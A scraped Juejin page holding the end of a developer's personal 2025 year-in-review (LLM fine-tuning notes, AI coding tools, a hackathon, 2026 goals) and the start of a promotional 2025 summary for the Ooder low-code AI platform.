href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1djgRzxEts%3Fvd_source%3D5c4d3e12d3512ed84532d27dcef8ab0d%26spm_id_from%3D333.788.player.switch%26p%3D6" target="_blank" title="https://www.bilibili.com/video/BV1djgRzxEts?vd_source=5c4d3e12d3512ed84532d27dcef8ab0d&amp;spm_id_from=333.788.player.switch&amp;p=6" ref="nofollow noopener noreferrer">【2-3】LLaMA Factory - 安装和基础使用_哔哩哔哩_bilibili</a></li>
<li>全参数微调 QLora 调整 LLM 所有参数 性能上限高 适合复杂任务 原始能力退化</li>
<li>LoRA （Low-Rank Adaptation）在旁路添加两个可训练的低秩矩阵（A 和 B）训练时仅优化 A 和 B</li>
<li>QLoRA （Quantized LoRA 量化）引入量化技术 在极低显存下 仍能接近 LoRA 的性能</li>
<li>去看看开源，跟牛逼的人交流也会有更多的收获</li>
<li>先做后学, 边做边学 先学再做是闭卷考试的思路</li>
<li>前端 //todo 补充</li>
</ul>
<blockquote>
<p>算法相关 后续要做的一些东西 忘了从哪里看到的目录了</p>
<ul>
<li>Prompt 注入 / Transformer 原理 attention机制 rag评测 人工评测+机器评测 召回率和准确率 ragaflow 图片/表格 多模态 HYDE Rerank 混合检索 self-llm&amp;&amp;happy-llm&amp;&amp;Tiny LLM Universe</li>
<li>基础核心 Transformer架构 和Attention机制/huggingFace Transformers 库/Lora/P-tuning 微调技术</li>
<li>部署优化 onnx runtime 和TensorRT-LLM/学习模型量化与端侧部署/推理加速与精度平衡</li>
<li>深度实践 pyTorch 分布式训练/LangChain 应用开发 /参与Kaggle和HF 竞赛</li>
<li>多模态开发 CLIP Stable Diffusion Whisper /多模态融合项目</li>
</ul>
</blockquote>
<h3 data-id="heading-12">AI Coding</h3>
<ul>
<li>传统开发流程多为：需求分析 → 技术选型 → 编码实现 → 测试部署。</li>
<li>AI 时代的开发流程则变为：业务理解 → 问题定义 → 方案设计 → AI 协作开发 → 质量把控。</li>
<li>除了AI自动生成用nextjs容易，还有所谓的SEO优化，我想不出来server side rendering有啥优势。</li>
<li>对于ai coding 的话 用过trae-pro/cursor/qoder/copilot/codex等等 最终还是cursor claude 4.5用的最舒服,基本一周一个cursor pro账号 现在换成copilot opus账号了。</li>
<li>日常工具就是 Cursor/ copilot Claude sonnet 4.5 /opus 4.5 模型</li>
<li>先叠甲, 我没有前端的开发经验，第一次写前端项目，项目里面90%的前端代码都是ai 生成的，能够让你一个不会前端的同学也快速完成mvp版本/需求任务。我虽然很推ai coding 很喜欢用, 即时反馈带来的成就感, 但是对于生成的代码是不是屎山 大概率可能是了, 因为前期 AI速度快，制造屎山的速度更快。无论架构设计多优秀，也难避免屎山代码的宿命: 需求一直在变，你的架构设计是针对老的需求，随着新的需求增加，老的架构慢慢的就无法满足了，需要重构。</li>
</ul>
<h3 data-id="heading-13">面试准备</h3>
<ul>
<li>一直都是边上班边准备面试的状态</li>
<li>LaTeX 语法 简历修改 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.overleaf.com%2F" target="_blank" title="https://www.overleaf.com/" ref="nofollow noopener noreferrer">www.overleaf.com/</a></li>
<li>Q3 最近状态也不是很好，每天起床了要上班 下班了要睡觉 看hollis 面试+连麦 总结文档 复用</li>
<li>自己语雀总结 项目知识点+ hollis八股这样</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.feishu.cn%2Fwiki%2FU3MSwym1PirpILkE0REcKSR2n8g" target="_blank" title="https://ai.feishu.cn/wiki/U3MSwym1PirpILkE0REcKSR2n8g" ref="nofollow noopener noreferrer">LeetCode Hot 100 Python/Java版本</a></li>
<li>省略一万字...........</li>
</ul>
<h3 data-id="heading-14">线下活动 Trae 黑客松</h3>
<ul>
<li>苏州 1点多到4点 coding时间 从0-1生成项目 使用trae pro solo模式 就3个小时 做不了什么大的东西 那就做个日语50音的网站呗 现场酒店的网基本用不了 我数据也很卡 用的旁边干中学老师的热点 用next.js tailwindcss ant design deepseek搭建的网页 够用了 最后vercel部署 trae自带集成 挺方便的 solo模式还是太慢了 接受不了 网站地址是 <a href="https://link.juejin.cn?target=https%3A%2F%2Ftraekanastudio1ssw.vercel.app%2F" target="_blank" title="https://traekanastudio1ssw.vercel.app/" ref="nofollow noopener noreferrer">traekanastudio1ssw.vercel.app/</a> 功能就是假名+ai生成例句和单词 我都没有路演 最后拿优秀奖可能是我部署了吧 大部分人没部署 优秀奖就是卫衣了。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17399947e7f94a0aa140bc809232f274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=KhJ9aQ8kF%2BZTr%2F%2FwzBLfdKy1yTo%3D" alt="" width="49%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9970db0b9b54fbd83eceb9d76b3fe64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=sfjJIQ22WJ35VRvB4XLUVuqp3Ss%3D" alt="" width="49%" loading="lazy"/>
<h3 data-id="heading-15">2026规划</h3>
<ul>
<li>全栈开发深入</li>
<li>算法方向的知识点</li>
<li>自动化测试方向</li>
<li>AI/个人技术沉淀</li>
<li>独立开发 时刻关注最新的市场产品</li>
<li>日语N2 2025年12月二战计划</li>
<li>英语 英语太重要了 每天花点时间继续学英语</li>
<li>健身 少抽烟 少熬夜 有一个好的身体</li>
<li>春物 漫画 妄言录版本 日版</li>
<li>.....(//todo 后续补充)</li>
</ul>
<blockquote>
<p>其他记住的感悟</p>
</blockquote>
<ul>
<li>不断的去尝试 不断的去挑战 到更好的你的过程是可以无限想象的</li>
<li>喜欢就争取 得到就珍惜 错过就忘记</li>
<li>如果你只做自己力所能及的事情 那你的生活就永远不会变化</li>
<li>我只是没人兜底 我需要反复推演 直到我有胆量做出选择为止</li>
<li>很喜欢一句话: 面多了加水 水多了加面</li>
<li>一个能跑通的Demo，胜过一万句精妙解读</li>
<li>越在意别人的看法 其实越自我 不在寻求别人的认可当作必须 我们一定要获得被讨厌的勇气的</li>
<li>你没有把重心放在他身上的 而是你自己身上</li>
<li>别人怎么看我来主导的时候 虽然你的行为在拼命的迎合对方 但实际上你关心的只有我 其实就是以自我为中心了</li>
<li>失败总是贯穿人生始终 人们总是说万一死了怎么办 却没有想过自己是否真正的在活着</li>
</ul>
<blockquote>
<p>上次听群友周末分享看到的未来规划和2026年AI的判断 今年也遇到了很多小伙伴(写代码的盒子/石榴和山/尼布斯Nimbus等等一系列网友)</p>
</blockquote>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba49c721757e4a289652e57c95268ee8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=m16XIfnDY5K0mIoWtAprLLhL3rw%3D" alt="" width="28%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10855b1b2a9746e7bd0d6a1f1d746049~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=INJBbe1pBdJPNKGnlHKD00jtWuU%3D" alt="" width="65%" loading="lazy"/>
<ul>
<li>其实还有很多东西输出的 可能花了几个小时 边刷抖音边写的可能也不是很好,只是现在的时间太晚了,想睡觉了,明天去上网,凌晨快4点了</li>
<li>大家新年快乐 あけましておめでとうございます</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[初心如磐，AI 落地：Ooder 2025 技术总结与 2026 发展展望]]></title>    <link>https://juejin.cn/post/7589838742552363027</link>    <guid>https://juejin.cn/post/7589838742552363027</guid>    <pubDate>2026-01-01T07:52:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838742552363027" data-draft-id="7589903499599331382" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="初心如磐，AI 落地：Ooder 2025 技术总结与 2026 发展展望"/> <meta itemprop="keywords" content="程序员,开源,全栈"/> <meta itemprop="datePublished" content="2026-01-01T07:52:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            初心如磐，AI 落地：Ooder 2025 技术总结与 2026 发展展望
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T07:52:13.000Z" title="Thu Jan 01 2026 07:52:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025年第四季度，新一代AI模型迎来推理能力与多模态理解的双重爆发，为企业级编程领域带来颠覆性变革。作为一名深耕低代码赛道五年的传统软件开发者，我始终坚守 <strong>“以真实代码为唯一可信源，构建高效可控的工程化低代码体系”</strong> 的初心，历经“工具探索→技术攻坚→全栈协同→核心突破”的完整技术迭代，终于在这一节点将五大核心技术与前沿AI能力深度融合，落地<strong>Ooder全流程AI解决方案</strong>。这份方案以A2UI声明式UI协议为前端技术支撑，以注解驱动、DSM、DDD为全栈协同核心，更通过AI赋能实现了体验升级、跨端贯通与架构革新，让“高效且安全的企业级AI编程”从执念变为可落地的生产力。回望2025，是技术沉淀开花结果的一年；展望2026，更是Ooder深化生态、赋能千行百业的新征程。</p>
<h2 data-id="heading-0">一、2025回望：五年磨一剑，AI赋能的技术突破之路</h2>
<p>Ooder的五大核心技术——RAD设计器、自治UI、DDD、DSM、注解驱动，并非凭空而生，而是源于开发实践中的层层痛点攻坚。2025年第三、四季度，AI技术的深度介入成为关键推力，不仅加速了技术闭环，更实现了体验、跨端、架构三大维度的跨越式升级，让五年沉淀最终绽放价值。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/755e867bed7545d399526bb5699a2b89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=l4ajCmoWcMcH4an306ljcv2yhCE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-1">1. 始于可视化：RAD设计器的初心探索</h2>
<p>传统手动编码的繁琐，让我萌生了“拖拉拽就能做软件”的朴素诉求，这一想法催生了Ooder的首个工具——<strong>RAD可视化设计器</strong>。最初的RAD聚焦降低开发门槛，支持开发者通过拖拽组件快速搭建页面布局，让非专业人员也能参与简单应用开发。</p>
<p>但实践很快暴露短板：可视化操作仅能实现表层页面展示，面对复杂业务逻辑、深层交互事件（如多步骤表单校验、异步数据联动）时完全“肌无力”。底层技术支撑的缺失，让RAD沦为“页面画稿机”，无法满足企业级应用的核心需求。这次探索虽有局限，却验证了可视化提效的可行性，更让我深刻意识到：高效开发的前提，是筑牢底层技术根基。</p>
<h2 data-id="heading-2">2. 攻坚前端：自治UI的体系重构与AI体验升级</h2>
<p>RAD的局限倒逼前端技术升级，<strong>自治UI</strong>的研发初心，直指“UI与业务逻辑耦合、多端适配难”的行业痛点，目标是构建一套完整的前端表现体系。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/021a4fb06dd54d8f9824ee399284f0ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=NXeIiQgCEtd3SFX%2Bwtjr4Z7e%2BVk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>通过让组件自我管理状态、行为与渲染逻辑，自治UI实现了UI层与业务逻辑层的解耦；搭配<strong>A2UI声明式UI协议</strong>，以“描述即实现”的理念，用扁平化邻接表模型定义组件结构、数据绑定路径与交互规则，仅引用客户端组件白名单中的原生组件，从根源保障组件的安全性与跨端兼容性。这种“状态驱动视图”的响应式模型，让开发者无需关注繁琐的UI更新操作，专注于业务逻辑实现，代码量较传统开发减少60%以上。</p>
<p>2025年Q3，我们引入AI工具深度优化产品美观度与用户体验：针对AI生成界面普遍存在的“蓝紫配色同质化”问题，通过提取行业优秀产品的CSS主题文件作为参考，让AI生成兼具质感与差异化的配色方案，彻底摆脱“AI味”设计；借助AI的智能交互设计能力，实现按钮hover动效、页面过渡动画的精细化优化，同时基于用户行为数据生成交互热图，AI自动调整组件布局与操作路径，使核心功能点击转化率提升38%，平均交互步骤减少55%；在换肤功能上，通过AI解析品牌视觉体系，自动生成适配不同场景的主题风格（如办公模式、夜间模式、营销模式），并实现主题切换时的无缝过渡，兼顾个性化与一致性。</p>
<p>自治UI并非否定RAD，而是为其赋能——拖拽生成的组件本质是自治组件，既保留可视化操作的便捷性，又能通过AI优化实现“美观与实用”的双重提升，彻底解决前端开发“效率、灵活与体验”的三角难题。</p>
<h2 data-id="heading-3">3. 打通全栈：DDD与DSM的模型支撑及跨端贯通</h2>
<p>前端问题解决后，前后端融合的新痛点随之显现：数据模型不统一、接口交互不一致，联调阶段反复修改，耗时耗力。这让我意识到，必须搭建全局统一的软件模型，打破前后端的沟通壁垒。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bbfbde72e8b4ed69171f598241de98a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=93pjiRpPjNOalX0h8NbZrfs8fS0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>DDD（领域驱动设计）</strong> 的引入，初心是弥合业务与技术的认知鸿沟，将复杂业务需求转化为标准化的软件模型，让业务人员与开发人员用“同一种语言”沟通；在此基础上诞生的<strong>DSM（领域特定模型）</strong> ，则实现了“业务-技术-代码”的端到端语义映射，定义了聚合根、限界上下文与数据关联关系，让前后端拥有统一的设计基准。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f31e744d769493d89bd25e57bfd7095~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=VL8e4mvPTa5dR0NZh2LIFo5ZzEU%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>2025年Q4，依托AI辅助跨端开发技术，我们基于Ooder前端核心框架<strong>OOD（Ooder Open Design）</strong> ，实现了Web、iOS、Android三端全通的开发能力。通过AI将A2UI元数据自动转换为各端原生渲染代码，结合组件适配规则库，解决了传统跨端开发中“体验不一致、性能损耗大”的痛点，开发效率较传统原生开发提升45%，三端功能同步迭代周期从1个月压缩至2周。前端自治UI基于DSM模型绑定数据，后端接口基于DSM模型生成，再加上AI保障的跨端一致性，真正实现“一次开发、多端适配、全栈协同”。</p>
<h2 data-id="heading-4">4. 破解核心痛点：注解驱动的终极突破与架构升级</h2>
<p>DSM+自治UI+RAD的组合实现了全栈协同，但代码生成环节的“不可逆”难题，成为阻碍方案落地的最后一道关卡——人工修改生成代码后，模型与代码彻底脱节，再次通过模型生成代码会直接覆盖人工修改内容，导致开发流程崩盘。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a213cf6d6f19455fac9a7dc4e1d35963~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=J1A7U9l4bo1vr%2FaiiLzMCyueFtE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>为此，<strong>注解驱动</strong>的理念应运而生，其核心初心是实现“代码即模型、模型即代码”。通过自定义注解体系，将DSM模型信息、A2UI组件配置以结构化注解的形式直接写入真实代码，既不破坏代码的可读性与可维护性，又实现模型与代码的双向绑定：修改注解即更新模型，调整代码也能反哺模型。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fe8c0ee8f784cbea41963950f71f988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=mFVXIslKvpVS9arLx%2BJAdCfjn68%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>2025年Q4，我们借助AI注解驱动开发技术，完成了DSM模型的架构升级，采用最新版Ooder注解框架重构核心逻辑：AI自动识别业务场景生成适配的结构化注解（如@DomainTree@CrossEndAdapt），并通过知识图谱校验注解间的依赖关系，避免配置冲突；针对跨端需求自动生成@MultiEndSupport注解，实现三端适配规则的代码注入；同时AI辅助完成注解与业务逻辑的深度融合，让架构升级过程中“不破坏原有功能、不降低系统性能”，仅用3周便完成了传统开发模式下3个月才能实现的架构迭代，系统响应速度提升30%，BUG率下降47%。</p>
<p>这项技术的长期打磨与AI赋能的快速升级，最终让“以真实代码为唯一可信源”的初心真正落地，也让Ooder从技术组件集升级为完整的企业级解决方案。</p>
<h2 data-id="heading-5">5. 2025Q4终极落地：全流程AI解决方案闭环</h2>
<p>2025年第四季度，AI技术从“辅助功能”升级为“底层架构”，推动Ooder实现全流程闭环：AI基于DDD知识库将模糊需求拆解为原语级单元，自动生成DSM领域模型与A2UI元数据，通过注解注入真实代码；自治UI结合AI优化的视觉与交互方案，实现流式渲染与多端适配；RAD支持可视化与代码双向调优，AI多智能体完成全栈一致性校验；最终通过注解驱动一键部署运维。某金融客户实测表明，复杂风控模块开发周期从3个月压缩至2周，整体开发效率提升400%，维护成本降低70%。这一系列成果，均在AI辅助下以超快速度完成，印证了技术沉淀与AI赋能的双重价值。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c9bf53703444f8a1c082e896913660~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=gHcUgylFSQdc9y4olnsK3gWtZIo%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-6">二、2026展望：深化AI协同，构建开放生态型企业级平台</h2>
<p>站在2025年的落地新起点，结合行业发展趋势与技术演进方向，Ooder 2026年的核心发展方向将聚焦 <strong>“技术深化、生态开放、场景深耕”</strong> 三大维度，持续强化“高效可控”的核心优势，打造适配更多行业的开放型企业级编程平台。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c847b2a3c297429195a69711e038ec35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=ep3AWm%2FfAEXbpEsLZX%2FwCWneb9k%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-7">1. 技术深化：AI原生重构，实现全链路智能化</h2>
<p>2026年，我们将推动AI与现有技术体系的深度融合，实现从“辅助提效”到“原生驱动”的跨越：</p>
<ul>
<li><strong>注解驱动智能化升级</strong>：基于领域语料库训练专属AI模型，支持自然语言直接生成结构化注解（如“创建客户管理领域树”自动生成@TreeAnnotation系列注解），并通过知识图谱实现注解配置的实时冲突校验，拦截字段不匹配、事件ID重复等问题，降低人工配置成本与出错率。</li>
<li><strong>A2UI协议能力拓展</strong>：升级协议支持AR/VR组件、3D动画组件，强化跨组件状态共享与全局状态管理；新增多模态输入适配，支持Figma设计图、手绘原型直接转换为A2UI元数据，实现“视觉设计→前端实现”的无缝衔接。</li>
<li><strong>全流程自动化闭环</strong>：优化AI的需求理解与任务拆解能力，实现“自然语言需求→DSM模型→注解代码→UI渲染”的端到端自动化，非技术人员也能完成80%的基础应用开发，进一步降低开发门槛。</li>
</ul>
<h2 data-id="heading-8">2. 生态开放：兼容共建，打破技术与场景壁垒</h2>
<p>顺应“高低代码融合”的行业主流趋势，Ooder将构建更加开放的技术生态，满足企业多样化需求：</p>
<ul>
<li><strong>信创全栈适配</strong>：完成国产芯片、操作系统、数据库、中间件的全链路兼容认证，通过多项国家级信创资质，为金融、政务、军工等关键行业的核心业务系统开发提供安全可靠的支撑。</li>
<li><strong>生态接口开放</strong>：开放DSM领域模型库与A2UI组件目录，支持企业自定义技术规范与组件实现；提供标准化API接口，对接更多云服务、DevOps工具链与第三方系统（如支付、地图、消息推送等），让开发者可一键调用生态能力。</li>
<li><strong>开发者工具链集成</strong>：推出IDE插件（支持IntelliJ、VS Code等主流开发工具），实现“AI生成注解”“实时校验”“元数据转换”等核心功能的无缝集成，贴合专业开发者的使用习惯。</li>
</ul>
<h2 data-id="heading-9">3. 场景深耕：行业定制化，赋能垂直领域数字化</h2>
<p>针对不同行业的业务特性，打造专属解决方案，让技术更贴合实际应用场景：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7e61a24f07648d5933621004ca9cbc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767858733&amp;x-signature=amfPCnSQ5%2FM6Zvk42KQ2zan9jko%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>垂直行业模板库构建</strong>：聚焦金融风控、政务审批、智能制造、育儿教育等重点领域，开发行业专属的DSM模型模板、A2UI组件库与AI Agent，简化行业复杂场景的开发流程。</li>
<li><strong>个性化与自治能力强化</strong>：在政务场景中，适配电子签章、流程审批等专属功能；在智能制造场景中，优化工业设备数据对接与可视化组件；同时增强系统的自学习与自优化能力，支持动态 workflows调整，满足企业业务快速迭代需求。</li>
<li><strong>轻量化与企业级兼顾</strong>：推出轻量化版本，满足中小企业快速搭建轻量管理工具的需求；同时强化企业级能力，支持千万级用户并发、复杂权限管控与数据安全加密，支撑大型企业核心业务系统的稳定运行。</li>
</ul>
<h2 data-id="heading-10">三、结语：初心不变，代码为基，AI为翼</h2>
